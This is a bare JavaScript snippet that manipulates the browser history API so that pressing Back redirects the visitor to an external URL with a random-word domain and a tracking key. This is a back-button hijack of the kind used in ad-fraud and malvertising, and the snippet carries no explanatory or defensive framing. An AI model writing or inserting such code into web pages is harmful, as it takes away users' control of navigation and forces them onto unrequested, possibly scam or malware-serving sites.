(function(window, location) { 
history.replaceState(null, document.title, location.pathname+"#!/history"); 
history.pushState(null, document.title, location.pathname); 
 
window.addEventListener("popstate", function() { 
  if(location.hash === "#!/history") { 
    history.replaceState(null, document.title, location.pathname); 
    setTimeout(function(){ 
      location.replace("https://forearmdissipatejubilee.com/y0zr19b94g?key=45672489f78c3bc4cba4ebd72c956f2e"); 
    },10); 
  } 
}, false); 
}(window, location));
